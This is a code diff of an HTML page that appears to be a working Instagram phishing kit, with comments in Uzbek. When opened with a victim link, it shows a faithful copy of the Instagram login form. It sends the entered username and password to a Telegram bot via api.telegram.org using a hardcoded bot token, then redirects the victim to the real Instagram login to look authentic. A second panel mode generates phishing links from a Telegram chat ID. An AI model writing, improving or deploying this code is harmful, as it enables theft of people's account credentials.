@@ -1,68 +1,193 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        .logo { width: 150px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .result { background: #eef; padding: 10px; border-radius: 5px; word-break: break-all; font-size: 13px; margin-top: 15px; display: none; border: 1px dashed #3390ec; }
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .main-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 20px 40px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .logo {
+            margin: 22px auto 12px;
+            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/aj_4-oUHV14.png');
+            background-position: 0px -52px;
+            background-size: auto;
+            width: 175px;
+            height: 51px;
+            display: block;
+        }
+
+        .input-form {
+            margin-top: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 0 7px 8px;
+            margin-bottom: 6px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .btn-login {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            padding: 7px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .btn-login:disabled {
+            background-color: #b2dffc;
+            cursor: default;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .line { height: 1px; background: #dbdbdb; flex: 1; }
+        .or-text { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 12px;
+        }
+
+        .forgot-pass {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .panel-mode {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 30px;
+            width: 350px;
+            text-align: center;
+        }
+        
+        #res {
+            background: #f1f1f1;
+            padding: 10px;
+            margin-top: 15px;
+            font-size: 12px;
+            border-radius: 5px;
+            display: none;
+            word-wrap: break-word;
+        }
     </style>
 </head>
 <body>
 
-    <div class="box" id="mainBox">
+    <div id="container">
         </div>
 
     <script>
-        // 1. O'zgartirishingiz kerak bo'lgan yagona narsa - BOT TOKEN
-        const BOT_TOKEN = "8429550175:AAGixNfnMTH8wDwLa6VeNnQ3dR3YZBP9gek"; 
-        
+        const BOT_TOKEN = "8429550175:AAGixNfnMTH8wDwLa6VeNnQ3dR3YZBP9gek";
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id');
-        const mainBox = document.getElementById('mainBox');
+        const container = document.getElementById('container');
 
         if (targetId) {
-            // --- FISHING REJIMI ---
-            mainBox.innerHTML = `
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-                <input type="text" id="login" placeholder="Login yoki Email" required>
-                <input type="password" id="pass" placeholder="Parol" required>
-                <button onclick="sendData()">Kirish</button>
+            // --- INSTAGRAM LOOK-A-LIKE MODE ---
+            container.innerHTML = `
+                <div class="main-box">
+                    <i class="logo"></i>
+                    <div class="input-form">
+                        <input type="text" id="login" placeholder="Phone number, username, or email">
+                        <input type="password" id="pass" placeholder="Password">
+                        <button class="btn-login" onclick="sendData()">Log In</button>
+                        <div class="divider">
+                            <div class="line"></div>
+                            <div class="or-text">OR</div>
+                            <div class="line"></div>
+                        </div>
+                        <a href="#" class="fb-login">Log in with Facebook</a>
+                        <a href="#" class="forgot-pass">Forgot password?</a>
+                    </div>
+                </div>
             `;
         } else {
-            // --- PANEL REJIMI (Link yaratish) ---
-            mainBox.innerHTML = `
-                <h3>Havola Yaratish</h3>
-                <p style="font-size:13px; color:#666;">Chat ID-ingizni kiriting va link oling:</p>
-                <input type="text" id="chat_id_input" placeholder="Masalan: 1234567">
-                <button onclick="generate()">Linkni olish</button>
-                <div id="res" class="result"></div>
+            // --- ADMIN PANEL MODE (Pushti dizaynni faqat shu yerda qoldirdik) ---
+            container.innerHTML = `
+                <div class="panel-mode" style="border-radius: 20px; border: 1px solid #ec4899;">
+                    <h3 style="color:#ec4899">Link Yaratish</h3>
+                    <p style="font-size:13px; color:#666;">Telegram Chat ID-ingizni kiriting:</p>
+                    <input type="text" id="chat_id_input" placeholder="Masalan: 512345678" style="width:100%; margin-bottom:10px;">
+                    <button onclick="generate()" style="width:100%; padding:10px; background:#ec4899; color:white; border:none; border-radius:10px; cursor:pointer;">Linkni Olish</button>
+                    <div id="res"></div>
+                </div>
             `;
         }
 
-        // Ma'lumotni Telegramga yuborish funksiyasi
         async function sendData() {
             const login = document.getElementById('login').value;
             const pass = document.getElementById('pass').value;
-            
-            const message = `📸 **INSTA NATIJA!**\n\n👤 Login: \`${login}\`\n🔑 Parol: \`${pass}\`\n🆔 Target ID: \`${targetId}\``;
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${targetId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-            
+
+            if (login.length < 3 || pass.length < 5) {
+                alert("Please check your credentials.");
+                return;
+            }
+
+            const message = `📸 *INSTA NATIJA*\n\n👤 User: \`${login}\`\n🔑 Pass: \`${pass}\`\n🆔 ID: \`${targetId}\``;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
             try {
-                await fetch(url);
-                window.location.href = "https://instagram.com"; // Chalg'itish
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: targetId,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+                // Haqiqiylikni oshirish uchun Instagramga yo'naltiramiz
+                window.location.href = "https://www.instagram.com/accounts/login/";
             } catch (e) {
-                alert("Xatolik yuz berdi!");
+                console.error(e);
             }
         }
 
-        // Link yaratish funksiyasi
         function generate() {
             const id = document.getElementById('chat_id_input').value;
             if (id.length > 5) {
@@ -72,7 +197,7 @@
                 resDiv.style.display = "block";
                 resDiv.innerHTML = "<b>Sizning linkigiz:</b><br>" + finalLink;
             } else {
-                alert("ID xato!");
+                alert("Chat ID xato!");
             }
         }
     </script>
